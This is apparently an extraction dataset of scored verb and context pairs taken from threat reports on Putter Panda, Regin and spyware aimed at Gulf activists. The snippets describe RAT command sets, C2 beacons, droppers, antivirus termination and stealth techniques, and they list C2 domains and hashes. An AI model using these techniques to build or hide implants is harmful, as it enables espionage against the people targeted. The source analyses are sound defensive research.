“Toot” from a machine named “toot-2a601225a8” logging in the CT RAT\n    and executing some commands')(0.8666666666666667, 'leading', '\n\n    We discovered this malware sample in June 2014, leading to a command & control (c&c) server still\n    in activity')(0.2, 'using', '\n\n    After these tests, we could see some real connections to a victim using this RAT')(0.6923076923076923, 'originated', '\n\n\n<figure></figure>\n\n                                   <caption>IP address used by TIEWEISHIPC computer</caption>\n\n    Some connections to the c&c originated from a computer named FLY-THINK with several IP\n    addresses, all located in Fuqing (Fujian province)')(0.42857142857142855, 'sent', '\n</section>\n<section>\n    <heading>Command & Control</heading>\n\n    The data sent in the POST request has a 0x11 bytes header consisting of a fixed-value byte (0xc3)\n    followed by a 0x10 bytes encryption key')(0.6666666666666666, 'execute', ' It can also download and execute binaries')(0.6666666666666666, 'download', ' It can also download and execute binaries')(0.7272727272727273, 'used', '\n</section>\n<section>\n\n            <heading>PALADIN RAT</heading>\n\n    This is another remote administration tool used by the Pitty Tiger group')(0.42857142857142855, 'receiving', ' Several threads are used to handle different stages of the\n C2 protocol, such as receiving data from the server, decrypting data, and processing\n commands')(0.6666666666666666, 'uses', ' The initial beacon uses a request with four parameters\n(h1, h2, h3, and h4) – as shown in Figure 8 – to register the implant with the C2 server')(0.09090909090909091, 'occurs', '\nThe operation of this RAT is described in detail in other CrowdStrike reporting, but is useful to revisit here to\nhighlight the characteristics of the RAT:                                              \n\n\n• C2 occurs over HTTP, after connectivity has been verified by making a distinctive request (to the URI /\nsearch?qu= at www.google.com)')(0.2727272727272727, 'disguise', '\n The dropped executable (MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d) primarily aims to inject\n the specified DLL (McUpdate.dll, MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f) into a process that\n would normally be accessing the network, likely in order to disguise the malicious activity')(0.45454545454545453, 'inject', '\n The dropped executable (MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d) primarily aims to inject\n the specified DLL (McUpdate.dll, MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f) into a process that\n would normally be accessing the network, likely in order to disguise the malicious activity')(0.5555555555555556, 'execute', ' The malware will then attempt to download content from the specified URL to the filename within\nthe user’s temporary directory, and then execute this file via the WinExec API')(0.7142857142857143, 'download', ' The malware will then attempt to download content from the specified URL to the filename within\nthe user’s temporary directory, and then execute this file via the WinExec API')(0.38461538461538464, 'uses', '\n</section>\n<footer>\n\n\n\n\n                                                                                                                  33\n</footer>\n<header>\x0cCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team\n</header>\n<section>\n <heading>HTTPCLIENT – EXAMPLE MD5 HASH\n 544FCA6EB8181F163E2768C81F2BA0B3</heading>\n Like pngdowner, the httpclient malware is a simple tool that provides a limited range of functionality and uses\n HTTP for its C2 channel')(0.42857142857142855, 'installing', '\n Another dropper has been observed, exclusively installing the pngdowner malware (example MD5 hash\n 4c50457c35e2033b3a03fcbb4adac7b7)')(0.08333333333333333, 'executed', '                                                                          \n Both the document and executable are written to disk and the executed via the ShellExecute             API (using the\n verb “open”)')(0.5, 'deploy', '\n\n\nThis toolset provides a wide degree of control over a victim system and can provide the\nopportunity to deploy additional tools at will')(1.0, 'provides', '\n\n\nThis toolset provides a wide degree of control over a victim system and can provide the\nopportunity to deploy additional tools at will')(0.375, 'retrieve', '\n</footnote>\n<footer>\n\n\n\n                                                                                                                                     30\n</footer>\n<header>\x0cCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team\n</header>\n\n\n<figure></figure>\n\nIf this request is also successful, the RAT will attempt to retrieve tasking from the\ncontroller using a further distinctive HTTP request shown in Figure 13, repeating this\n                                                                                  \nrequest every two seconds until valid tasking is returned')(0.5945945945945946, 'use', ' The RAT will then use a byte-wise subtraction-\nbased algorithm (using a hard-coded modulo value) to decode C2 server details\nconsisting of a server hostname and port number, in this example nsc.adomhn')(0.47368421052631576, 'perform', '\n\n\nInitially, the malware will perform a connectivity check to a hard-coded URL (http://www.microsoft.com),\nusing a constant user agent Mozilla/4.0 (Compatible; MSIE 6.0;)')(0.7777777777777778, 'create', '\n\n\nOn startup, the RAT attempts to create a file mapping named\n&*SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf')(1.0, 'connect', '\n\n\n The malware will then connect to its configured C2 infrastructure (file.anyoffice.info) and perform a HTTP\n request of the form shown in Figure 14 below:\n\n\n\n<figure></figure>\n<caption>Figure 14')(0.875, 'perform', '\n\n\n The malware will then connect to its configured C2 infrastructure (file.anyoffice.info) and perform a HTTP\n request of the form shown in Figure 14 below:\n\n\n\n<figure></figure>\n<caption>Figure 14')(0.875, 'serves', ' An initial request is made to the C2 server (illustrated\n in Figure 11 above), but the response value is effectively ignored; it is likely that this\n request serves only as a connectivity check, as further C2 activity will only occur\n if this first request is successful')(0.6111111111111112, 'extract', ' If this request fails, the malware will attempt to\nextract proxy details and credentials from Windows Protected Storage, and from the IE Credentials Store using\npublicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound HTTP\naccess')(0.2608695652173913, 'sent', ' Output data produced by tasking instructions is encrypted in the same manner as it\nwas decrypted and sent back to the C2 server via HTTP POST request to a URI of the form /microsoft/errorpost/\ndefault.aspx?ID=, where the ID value is a random number in decimal representation – as with the initial request\nshown in Figure 4')(0.6363636363636364, 'register', ' It is likely that this request functions as a means to authenticate\n the RAT to the C2 server and register a new victim machine with the controller')(0.8421052631578947, 'performs', ' This malware also initially performs a connectivity check to www.microsoft.com using\n the hard-coded user agent Mozilla/4.0 (Compatible; MSIE 6.0;), although in this variant no attempt is made to\n extract proxy credentials')(0.2, 'executing', ' This\n dropper uses RC4 to decrypt an embedded payload from data in an embedded resource before writing the\n payload to disk and executing it')(0.7142857142857143, 'writing', ' This\n dropper uses RC4 to decrypt an embedded payload from data in an embedded resource before writing the\n payload to disk and executing it')(0.14285714285714285, 'sleeping', '\n\n\nThe set of commands supported by the RAT is somewhat limited, indicating that perhaps the RAT is intended\nto be used as a second-stage tool, or as a failsafe means for the attackers to regain basic access to a\ncompromised system (which is consistent with its support for sleeping until a certain date/time)')(0.875, 'supported', '\n\n\nThe set of commands supported by the RAT is somewhat limited, indicating that perhaps the RAT is intended\nto be used as a second-stage tool, or as a failsafe means for the attackers to regain basic access to a\ncompromised system (which is consistent with its support for sleeping until a certain date/time)')(0.3333333333333333, 'conduct', ' The RATs are used by the PUTTER PANDA actors to\nconduct intelligence-gathering operations with a significant focus on the space technology sector')(0.38461538461538464, 'using', ' 3PARA\n RAT Initial Beacon</caption>\n\n\n\n\n As with the 4H RAT, the C2 protocol used by the 3PARA RAT is HTTP based, using\n both GET and POST requests')(0.6, 'is', ' 3PARA\n RAT Initial Beacon</caption>\n\n\n\n\n As with the 4H RAT, the C2 protocol used by the 3PARA RAT is HTTP based, using\n both GET and POST requests')(0.8571428571428571, 'used', ' 3PARA\n RAT Initial Beacon</caption>\n\n\n\n\n As with the 4H RAT, the C2 protocol used by the 3PARA RAT is HTTP based, using\n both GET and POST requests')(0.5263157894736842, 'transmit', ' In this case, the RAT will transmit some basic victim\n information to the C2 server along with a 256-byte hash of the hard-coded string\n HYF54&%9&jkMCXuiS')(0.38461538461538464, 'supported', '\n• The commands supported by the RAT enable several capabilities, including:\n<list>\n   o Remote shell\n   o\n   \x07 Listing of running processes (including loaded modules)\n   o Process termination (specified by PID)\n   o File and directory listing\n   o File upload, download, deletion, and timestamp modification\n</list>\n<footer>\n\n\n\n\n                                                                                                                    27\n</footer>\n<header>\x0cCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team\n</header>\n\n\n<figure></figure>\n<caption>\nFigure 8')(0.6, 'used', '\n</section>\n<footer>\n\n\n                                              7\n</footer>\n<header>\x0cCrowdStrike Intelligence Report\nCrowdstrike Global Intelligence Team</header>\n\n<section>\n                                        <heading>C2 Indicators</heading>\n                                        Although some of the domains used\n                                        for command and control of the tools\n                                        described later in this report appear\n                                        to be legitimate sites that have been\n                                        compromised in some way, many of\n                                        them appear to have been originally\n                                        registered by the operators')(0.42857142857142855, 'install', '\n\n</section>\n<section> \n <heading>DROPPERS – RC4 AND XOR BASED</heading>\n Other CrowdStrike reporting describes a dropper used by PUTTER PANDA (abc.scr) to install the 4H RAT')(0.38461538461538464, 'used', '\n\n</section>\n<section> \n <heading>DROPPERS – RC4 AND XOR BASED</heading>\n Other CrowdStrike reporting describes a dropper used by PUTTER PANDA (abc.scr) to install the 4H RAT')(0.35714285714285715, 'terminate', ' If Internet Explorer is used, then the malware will attempt to terminate processes\n corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe)')(0.8461538461538461, 'load', '\n\n\n Once running, the RAT will load a binary representation of a date/time value<fn>13</fn> from a\n file C:\\RECYCLER\\restore.dat, and it will sleep until after this date/time has passed')(0.25, 'sleep', '\n\n\n Once running, the RAT will load a binary representation of a date/time value<fn>13</fn> from a\n file C:\\RECYCLER\\restore.dat, and it will sleep until after this date/time has passed')(0.5, 'remain', ' Database\n provides a mechanism for the operators to allow the RAT to remain dormant until a\n fixed time, perhaps to allow a means of regaining access if other parts of their toolset\n are removed from a victim system')(0.7272727272727273, 'delete', ' Finally, the malware will delete the content saved from the first\nrequest, and exit')(1.0, 'provides', ' Although some of their tools are\nsimplistic, taken as a whole their toolset provides a wide degree of control\nover a victim system and can provide the opportunity to deploy additional\ntools at will')(0.42857142857142855, 'deploy', ' Although some of their tools are\nsimplistic, taken as a whole their toolset provides a wide degree of control\nover a victim system and can provide the opportunity to deploy additional\ntools at will')(0.5555555555555556, 'using', '\n Four examples of these droppers were located, using a mixture of decoy PDF and Microsoft Word documents\n (shown below in Figures 15-18)')(0.375, 'deploy', '\n\n➔ \x07They focus their exploits against\n popular productivity applications\n such as Adobe Reader and Microsoft\n    Office to deploy custom malware\n through targeted email attacks')(0.6666666666666666, 'deploy', ' They focus their exploits against popular productivity\napplications such as Adobe Reader and Microsoft Office to deploy custom malware through\ntargeted email attacks')(0.7272727272727273, 'characterizes', '\n• A series of HTTP requests characterizes the RAT’s C2')(1.0, 'monitor', ' For example, one module was designed to\n    monitor network traffic to Microsoft Internet Information Services (IIS) web servers, another was designed\n    to collect administration traffic for mobile telephony base station controllers, while another was created\n    specifically for parsing mail from Exchange databases')(0.5714285714285714, 'parsing', ' For example, one module was designed to\n    monitor network traffic to Microsoft Internet Information Services (IIS) web servers, another was designed\n    to collect administration traffic for mobile telephony base station controllers, while another was created\n    specifically for parsing mail from Exchange databases')(1.0, 'collect', ' For example, one module was designed to\n    monitor network traffic to Microsoft Internet Information Services (IIS) web servers, another was designed\n    to collect administration traffic for mobile telephony base station controllers, while another was created\n    specifically for parsing mail from Exchange databases')(1.0, 'capturing', ' The threat’s standard capabilities include several remote access Trojan (RAT) features, such as\n    capturing screenshots and taking control of the mouse’s point-and-click functions')(0.37037037037037035, 'include', ' The threat’s standard capabilities include several remote access Trojan (RAT) features, such as\n    capturing screenshots and taking control of the mouse’s point-and-click functions')(0.5, 'taking', ' The threat’s standard capabilities include several remote access Trojan (RAT) features, such as\n    capturing screenshots and taking control of the mouse’s point-and-click functions')(0.2727272727272727, 'originated', ' On\n    one computer, log files show that\n    Regin originated from Yahoo! Instant\n    Messenger through an unconfirmed\n    exploit')(0.42857142857142855, 'happen', ' All\n\n  communications are strongly encrypted and\n  can happen in a two-stage fashion where the\n  attacker may contact a compromised computer\n  using one channel to instruct it to begin\n  communications on a different channel')(0.18181818181818182, 'instruct', ' All\n\n  communications are strongly encrypted and\n  can happen in a two-stage fashion where the\n  attacker may contact a compromised computer\n  using one channel to instruct it to begin\n  communications on a different channel')(0.6666666666666666, 'contact', ' All\n\n  communications are strongly encrypted and\n  can happen in a two-stage fashion where the\n  attacker may contact a compromised computer\n  using one channel to instruct it to begin\n  communications on a different channel')(0.42857142857142855, 'begin', ' All\n\n  communications are strongly encrypted and\n  can happen in a two-stage fashion where the\n  attacker may contact a compromised computer\n  using one channel to instruct it to begin\n  communications on a different channel')(0.2857142857142857, 'stealing', '\n                           •\t   Partial: Log type, last log, older log timestamps\n                           •\t   Complete: Entire log data is exfiltrated\n\n</table>\n    The IIS web server log stealing module, 27E9h, is an example of a payload module that was installed after the initial\n    infection and was specifically deployed for a particular target')(0.38461538461538464, 'looks', ' Rather than loading Stage 2 from an NTFS extended attribute, Stage 1 looks for the last partition (in terms of\n\n\n\n\n                                              <footer>         Page 15</footer>\n\x0c                                           <header>    Regin: Top-tier espionage tool enables stealthy surveillance</header>\n\n\n\n\n    physical location) on disk and searches for the payload in the raw sectors in this area of the disk')(0.3125, 'loaded', ' Instead, Stage 1 is a user mode DLL loaded as a Winsock helper when the computer is starting\n    up')(0.5, 'implicated', '\n\n  The main purpose of Regin is intelligence gathering and it has been implicated in data\n  collection operations against government organizations, infrastructure operators,\n  businesses, academics, and private individuals')(1.0, 'is', '\n\n  The main purpose of Regin is intelligence gathering and it has been implicated in data\n  collection operations against government organizations, infrastructure operators,\n  businesses, academics, and private individuals')(0.8181818181818182, 'serve', ' Furthermore, compromised\n  computers can serve as a proxy for other\n  infections and command and control can\n  also happen in a peer-to-peer fashion')(0.5, 'happen', ' Furthermore, compromised\n  computers can serve as a proxy for other\n  infections and command and control can\n  also happen in a peer-to-peer fashion')(0.3125, 'drops', ' This stage drops the file msrdc64.dat, which appears to always\n  be 512 bytes in size')(0.875, 'hide', '\n\n  Stage 2 can be found encrypted in:\n<list>\n  Extended attribute\n  •\t %Windir%\n  •\t %Windir%\\fonts\n  •\t %Windir%\\cursors (possibly only in version 2.0)\n  Registry subkey\n  •\t HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4F20E605-9452-4787-B793-\n     D0204917CA58}\n  •\t HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\RestoreList\\VideoBase (possibly only in version\n     2.0)\n</list>\n  This stage can also hide running instances of Stage 1')(0.16666666666666666, 'remaining', ' It is built\n  on a framework that is designed to sustain long-term intelligence-gathering operations\n  by remaining under the radar')(0.6666666666666666, 'sustain', ' It is built\n  on a framework that is designed to sustain long-term intelligence-gathering operations\n  by remaining under the radar')(0.5, 'retrieve', ' It can\n    also scan for deleted files on an infected computer and retrieve them')(0.8888888888888888, 'scan', ' It can\n    also scan for deleted files on an infected computer and retrieve them')(0.5, 'initiate', ' These\n  backchannel operations are bidirectional,\n  which means either the attackers can initiate\n  communications with compromised computers\n  on the border network or the compromised\n  computers can initiate communications with\n  the attacker')(0.5, 'are', ' These\n  backchannel operations are bidirectional,\n  which means either the attackers can initiate\n  communications with compromised computers\n  on the border network or the compromised\n  computers can initiate communications with\n  the attacker')(0.5714285714285714, 'hide', '\n\n    Regin goes to some lengths to hide the data it is stealing')(0.5, 'load', ' These kernel drivers may be registered as a system\n  service or may have an associated registry key to load the driver while the computer is starting up')(0.7777777777777778, 'gather', ' Regin is also configured to\n    steal passwords, monitor network traffic, and gather information on processes and memory utilization')(0.25, 'steal', ' Regin is also configured to\n    steal passwords, monitor network traffic, and gather information on processes and memory utilization')(0.5454545454545454, 'logs', ' The container’s sectors</caption>\n<table>\nOffset      Type                   Description\n00h         DWORD                  Next sector offset, or 0\n04h         BYTE[sectsize-4]       Data\n</table>\n</section>\n<section>\n<heading>Logging</heading>\n  Regin logs data to the ApplicationLog.dat file')(0.6666666666666666, 'receive', '\n</cover>\n\x0c                                                     <header>   Regin: Top-tier espionage tool enables stealthy surveillance</header>\n\n\n\n<section>\n<heading>Payloads</heading>\n    Regin can be distributed with various payload modules or receive payload modules after infection')(0.8, 'is', '\n</section>\n<section>\n<heading>Stage 1</heading>\n  Stage 1 is the initial load point for the threat')(0.7777777777777778, 'is', ' The encryption\n  mode is reverse cipher feedback (CFB)')(0.25, 'stealing', '\n\n    Regin has a wide range of standard capabilities, particularly around monitoring targets and stealing data')(0.3333333333333333, 'monitoring', '\n\n    Regin has a wide range of standard capabilities, particularly around monitoring targets and stealing data')(0.75, 'monitor', '\n\n  Stage 2 can also monitor the state of the threat')(0.7777777777777778, 'retrieve', ' We also recovered files from infected\n    computers that may or may not be associated with 64-bit Regin, including several variants of svcsstat.exe, a file that\n    aims to retrieve binary data over pipes or sockets and execute the data')(0.3333333333333333, 'execute', ' We also recovered files from infected\n    computers that may or may not be associated with 64-bit Regin, including several variants of svcsstat.exe, a file that\n    aims to retrieve binary data over pipes or sockets and execute the data')(0.75, 'execute', ' Symantec believes that\n  once the dropper is executed on the target’s computer, it will install and execute Stage 1')(0.5, 'install', ' Symantec believes that\n  once the dropper is executed on the target’s computer, it will install and execute Stage 1')(0.4375, 'installing', '\n\n    Regin is capable of installing a large number of additional payloads, some highly customized for the targeted\n    computer')(0.2222222222222222, 'conceal', ' It goes to extraordinary lengths to conceal itself and its\n  activities on compromised computers')(1.0, 'makes', ' The modular design also makes analysis of the\n  threat difficult, as all components must be available in order to fully understand it')(0.8461538461538461, 'involve', ' The initial\n    stages involve the installation and configuration\n    of the threat’s internal services')(0.5, 'seek', ' APTs typically seek specific\n  information, usually intellectual property')(0.6666666666666666, 'are', '\n</section>\n<section>\n<heading>Command-and-control operations</heading>\n\n  Regin’s C&C operations are extensive')(0.0967741935483871, 'include', ' These modules can\ninclude data collectors, a self-defense engine which detects if attempts to detect the toolkit occur, functionality for encrypted communications, network capture\nprograms, and remote controllers of different kinds')(0.4444444444444444, 'detects', ' These modules can\ninclude data collectors, a self-defense engine which detects if attempts to detect the toolkit occur, functionality for encrypted communications, network capture\nprograms, and remote controllers of different kinds')(1.0, 'disguise', '\n\nThe Regin loaders that are disguised as Microsoft drivers with names such as:\n<list>\n    serial.sys\n    cdaudio.sys\n    atdisk.sys\n    parclass.sys\n    usbclass.sys\n</list>\n\x0cMimicking Microsoft drivers allows the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems')(0.3, 'appear', '\n\nThe Regin loaders that are disguised as Microsoft drivers with names such as:\n<list>\n    serial.sys\n    cdaudio.sys\n    atdisk.sys\n    parclass.sys\n    usbclass.sys\n</list>\n\x0cMimicking Microsoft drivers allows the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems')(0.6, 'Mimicking', '\n\nThe Regin loaders that are disguised as Microsoft drivers with names such as:\n<list>\n    serial.sys\n    cdaudio.sys\n    atdisk.sys\n    parclass.sys\n    usbclass.sys\n</list>\n\x0cMimicking Microsoft drivers allows the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems')(0.5714285714285714, 'loaded', '\n</section>\n<section>\n<heading>Stealth Implant</heading>\n\nThe Intercept’s investigation revealed a sample uploaded on VirusTotal on March 14th 2012 that presents the unique 0xfedcbafe header, which is a sign that it\nmight have been loaded by a Regin driver and it appears to provide stealth functionality for the tool kit')(0.7777777777777778, 'provide', '\n</section>\n<section>\n<heading>Stealth Implant</heading>\n\nThe Intercept’s investigation revealed a sample uploaded on VirusTotal on March 14th 2012 that presents the unique 0xfedcbafe header, which is a sign that it\nmight have been loaded by a Regin driver and it appears to provide stealth functionality for the tool kit')(0.5, 'steal', ' The malicious\nLinkedIn page launched a malware attack, infecting the employees’ computers and giving the spies total control of their systems, allowing GCHQ to get deep\ninside Belgacom’s networks to steal data')(0.4, 'giving', ' The malicious\nLinkedIn page launched a malware attack, infecting the employees’ computers and giving the spies total control of their systems, allowing GCHQ to get deep\ninside Belgacom’s networks to steal data')(0.75, 'steals', '\n\nThe malware, which steals data from infected systems and disguises itself as legitimate Microsoft software, has also been identified on the same European Union\ncomputer systems that were targeted for surveillance by the National Security Agency')(0.75, 'loads', ' It initializes the core components of the architecture and loads the next parts of the\nmalware')(1.0, 'initializes', ' It initializes the core components of the architecture and loads the next parts of the\nmalware')(0.21621621621621623, 'checks', '\n\nThis Regin driver recurrently checks that the current IRQL (Interrupt Request Level) is set to PASSIVE_LEVEL using the KeGetCurrentIrql() function in many\nparts of the code, probably in order to operate as silently as possible and to prevent possible IRQL confusion')(0.75, 'cleans', '\n</section>\n<section>\n<heading>Second stage loader</heading>\n\nWhen launched, it cleans traces of the initial loader, loads the next part of the toolkit and monitors its execution')(0.2222222222222222, 'monitors', '\n</section>\n<section>\n<heading>Second stage loader</heading>\n\nWhen launched, it cleans traces of the initial loader, loads the next part of the toolkit and monitors its execution')(0.7777777777777778, 'loads', '\n</section>\n<section>\n<heading>Second stage loader</heading>\n\nWhen launched, it cleans traces of the initial loader, loads the next part of the toolkit and monitors its execution')(0.6, 'adapts', '\n\nThe driver also contains routines to check for specific builds of the Windows kernel in use, including very old versions such as for Windows NT4 Terminal Server\nand Windows 2000, and then adapts its behavior accordingly')(0.6363636363636364, 'replacing', ' The malware zeroes out its PE (Portable Executable, the Windows executable format) headers in memory, replacing “MZ” with its own magic\nmarker 0xfedcbafe')(0.3333333333333333, 'avoid', '\n\nOne of the keys to Regin is its stealth: To avoid detection and frustrate analysis, malware used in such operations frequently adhere to a modular design')(1.0, 'zeroes', '\n\nIn addition, when freeing memory using ExFreePool(), the driver zeroes the content, probably to avoid leaving traces in pool memory')(0.5555555555555556, 'avoid', '\n\nIn addition, when freeing memory using ExFreePool(), the driver zeroes the content, probably to avoid leaving traces in pool memory')(0.5, 'remove', '\n\nUpon execution of the unload routine (located at 0xFDEFA04A), the driver performs a long sequence of steps to remove remaining traces and artifacts')(0.875, 'access', '\n\n\n<figure></figure>\n\n<caption>This picture shows the very first bytes of the sample in question, showing the unique 0xfedcbafe header at the beginning.</caption>\n\nIn order to access information stored in the computer’s memory, programs use objects that reference specific locations in memory called pointers')(0.7, 'conduct', '\n\nThe implants allowed GCHQ to conduct surveillance of internal Belgacom company communications and gave British spies the ability to gather data from the\ncompany’s network and customers, which include the European Commission, the European Parliament, and the European Council')(0.14285714285714285, 'gather', '\n\nThe implants allowed GCHQ to conduct surveillance of internal Belgacom company communications and gave British spies the ability to gather data from the\ncompany’s network and customers, which include the European Commission, the European Parliament, and the European Council')(1.0, 'gained', ' “It’s always been clear to us the malware was highly sophisticated, but ever since the clean-up this whole story belongs to the past for\nus.”\n\nIn a hacking mission codenamed Operation Socialist, GCHQ gained access to Belgacom’s internal systems in 2010 by targeting engineers at the company')(0.8, 'talked', ' Three\nmonths after Author was targeted, Ahmed received an e-mail\ncontaining an attachment with Xtreme RAT that talked to the\nsame C&C server (Figure 5), suggesting that the attackers who\ninfected Ahmed with RCS may have provided a list of interest-\ning e-mail addresses to another group for further targeting')(0.23684210526315788, 'received', ' Three\nmonths after Author was targeted, Ahmed received an e-mail\ncontaining an attachment with Xtreme RAT that talked to the\nsame C&C server (Figure 5), suggesting that the attackers who\ninfected Ahmed with RCS may have provided a list of interest-\ning e-mail addresses to another group for further targeting')(0.48, 'include', ' The attacks include spyware for ongoing\nmonitoring and the use of “IP spy” links to deanonymize those\nwho voice dissent')(0.6363636363636364, 'involved', '\n   The first attacks we observed in the UAE involved a\ngovernment-grade “lawful interception” trojan known as Re-\nmote Control System (RCS), sold by the Italian company Hack-\ning Team')(0.35714285714285715, 'records', ' The attacker sent the e-mails using\nReadNotify.com, which records the user’s IP address upon\n\n<footer>USENIX Association \t                                                                                                                  23rd USENIX Security Symposium\u2003 515</footer>\n\x0ctheir mail client downloading the remote image.<fn>6</fn>\n   While ReadNotify.com forbids spoofing in their TOS,\nthe service has a vulnerability known to the attackers (and\nwhich we confirmed) that allows spoofing the From address\nby directly setting the parameters on a submission form on their\nwebsite')(0.16279069767441862, 'sent', ' The attacker sent the e-mails using\nReadNotify.com, which records the user’s IP address upon\n\n<footer>USENIX Association \t                                                                                                                  23rd USENIX Security Symposium\u2003 515</footer>\n\x0ctheir mail client downloading the remote image.<fn>6</fn>\n   While ReadNotify.com forbids spoofing in their TOS,\nthe service has a vulnerability known to the attackers (and\nwhich we confirmed) that allows spoofing the From address\nby directly setting the parameters on a submission form on their\nwebsite')(0.2, 'received', ' (Interestingly, spyware subse-\nquently sent to others has used bait content about Ahmed.)\n\n   Further attacks: In October 2012, UAE Journalist A and\nHuman Rights activist B (per Figure 6) forwarded us suspi-\ncious e-mails they had received that contained a Word docu-\nment corresponding to the first stage of 3-Stage Exploit Kit\n(Figure 5)')(0.6666666666666666, 'used', ' (Interestingly, spyware subse-\nquently sent to others has used bait content about Ahmed.)\n\n   Further attacks: In October 2012, UAE Journalist A and\nHuman Rights activist B (per Figure 6) forwarded us suspi-\ncious e-mails they had received that contained a Word docu-\nment corresponding to the first stage of 3-Stage Exploit Kit\n(Figure 5)')(0.36363636363636365, 'obtain', ' The attacks we have\ndocumented usually involve the use of malicious links or e-mail\nattachments, designed to obtain information from a device')(0.5909090909090909, 'involve', ' The attacks we have\ndocumented usually involve the use of malicious links or e-mail\nattachments, designed to obtain information from a device')(0.35, 'including', '\n</footnote>\n   sophisticated than FinSpy and RCS, they share the same ba-\nsic functionality, including screen capture, keylogging, remote\nmonitoring of webcams and microphones, remote shell, and file\nexfiltration')(0.26666666666666666, 'loads', ' When run, the\nsample unpacks a compiled Visual Basic project that loads, via\nthe RunPE method <fn>[62]</fn> , an executable packed with UPX <fn>[63]</fn> ')(0.5333333333333333, 'talked', ' This address was un-\nreachable when we probed it; a researcher pointed us to an FS-\nBSpy sample that contained an Arabic-language bait document\nabout Omani poetry, which talked to a C&C in the UK')(0.55, 'contained', ' This address was un-\nreachable when we probed it; a researcher pointed us to an FS-\nBSpy sample that contained an Arabic-language bait document\nabout Omani poetry, which talked to a C&C in the UK')(1.0, 'used', ' The executables used virtualized obfusca-\ntion <fn>[28]</fn> , which appeared to be custom-designed')(0.7, 'writes', '\n   To exfiltrate data back to the C&C server, a module encrypts\nand writes it to disk in a special folder')(0.35714285714285715, 'communicated', ' (RCS\ntraffic is identifiable based on a distinctive user agent and URL\nin POST requests.) A sample of FSBSpy apparently installed\nfrom an exploit on a Turkish server talked to one of the servers\nin this group.<fn>[79]</fn>\n   We also found server groups containing servers in Uzbek-\nistan and Kazakhstan; we found FSBSpy samples on Virus-\nTotal uploaded from these countries that communicated with\nservers in these groups')(0.5714285714285714, 'talked', ' (RCS\ntraffic is identifiable based on a distinctive user agent and URL\nin POST requests.) A sample of FSBSpy apparently installed\nfrom an exploit on a Turkish server talked to one of the servers\nin this group.<fn>[79]</fn>\n   We also found server groups containing servers in Uzbek-\nistan and Kazakhstan; we found FSBSpy samples on Virus-\nTotal uploaded from these countries that communicated with\nservers in these groups')(1.0, 'uses', ' Finally, FinSpy’s wire protocol for C&C commu-\nnication uses the same type of encryption, and thus is subject\nto the same brute force attack on AES keys')(0.10526315789473684, 'sent', ' However, the account also directly crit-\nicized the King on occasion, in one case referring to him as\n“weak” and “stingy.” An account linked to al9mood sent Je-\nhad Abdulla an IP spy link on 10/2/12 in a public message')(0.4583333333333333, 'include', '\nAs summarized in Table 3, the attacks often include fake or ma-\nliciously packaged security tools; intriguing, or ideological, or\nmovement-relevant content (e.g')(0.3181818181818182, 'forwarded', ' We grouped servers by the SSL certificates they\nreturned, and found that each group forwarded to only a sin-\ngle server, except for one case where a group forwarded to two\ndifferent IPs (both in Morocco)')(0.375, 'using', ' The\nthird attack in Figure 3, observed in October 2013, entices tar-\ngets with e-mails purporting to contain or link to videos about\nthe current conflict, infecting victims with Xtreme RAT, and\nusing the C&C tn1.linkpc.net')(0.5454545454545454, 'received', ' Member C received a malicious\nfile as an e-mail attachment, while NGO Worker D was sent a\nshortened link (url[.] no/Uu5) to a download from a directory\nof Mrconstrucciones[.] net,<fn>7</fn>  a site that may have been com-\npromised')(1.0, 'report', ' We also similarly obtained and analyzed sam-\nples of FSBSpy <fn>[72]</fn> , a piece of malware that can report system\ninformation, upload screenshots, and drop and execute more\nmalware')(0.7142857142857143, 'upload', ' We also similarly obtained and analyzed sam-\nples of FSBSpy <fn>[72]</fn> , a piece of malware that can report system\ninformation, upload screenshots, and drop and execute more\nmalware')(1.0, 'adds', ' For example, the RCS\n sample sent to Ahmed adds a Run registry key, whereas the\n FinSpy samples used in Bahrain overwrite the hard disk’s boot\n sector to modify the boot process; the spyware is loaded be-\n\n<footer>518\u2003 23rd USENIX Security Symposium\n</footer>\n\x0cfore the OS, and injects itself into OS processes as they start')(0.9, 'modify', ' For example, the RCS\n sample sent to Ahmed adds a Run registry key, whereas the\n FinSpy samples used in Bahrain overwrite the hard disk’s boot\n sector to modify the boot process; the spyware is loaded be-\n\n<footer>518\u2003 23rd USENIX Security Symposium\n</footer>\n\x0cfore the OS, and injects itself into OS processes as they start')(1.0, 'download', '\n\n   Analysis of capabilities: We found that the spyware has\na modular design, and can download additional modules from\na command & control (C&C) server, including password cap-\nture (from over 20 applications) and recording of screenshots,\nSkype chat, file transfers, and input from the computer’s micro-\nphone and webcam')(0.09090909090909091, 'including', '\n\n   Analysis of capabilities: We found that the spyware has\na modular design, and can download additional modules from\na command & control (C&C) server, including password cap-\nture (from over 20 applications) and recording of screenshots,\nSkype chat, file transfers, and input from the computer’s micro-\nphone and webcam')(0.25, 'communicated', '\n\n   C&C server:            The samples communicated with\n77.69.140.194, which belongs to a subscriber of\nBatelco, Bahrain’s main ISP')(0.375, 'downloaded', ' The exploit\ndownloaded a second stage, which in turn downloaded a sam-\nple of SpyNet from maile-s.com')(0.8, 'communicated', ' The RCS\nsamples also communicated with domains with lapsed registra-\n\ntions, so we registered them to observe incoming traffic')(0.75, 'thwarted', '\n\n\n   Analysis of encryption: Because the malware employed\nmyriad known anti-debugging and anti-analysis techniques, it\nthwarted our attempts to attach debuggers')(1.0, 'employed', '\n\n\n   Analysis of encryption: Because the malware employed\nmyriad known anti-debugging and anti-analysis techniques, it\nthwarted our attempts to attach debuggers')(0.6818181818181818, 'include', ' The messages\nusually include text, often in Arabic, that attempts to persuade\nthe target to execute the file or click the link')(0.6666666666666666, 'using', ' An\nunidentified dropper using this C&C targeted Journalist F; a\nSpyNet attack on Relative of 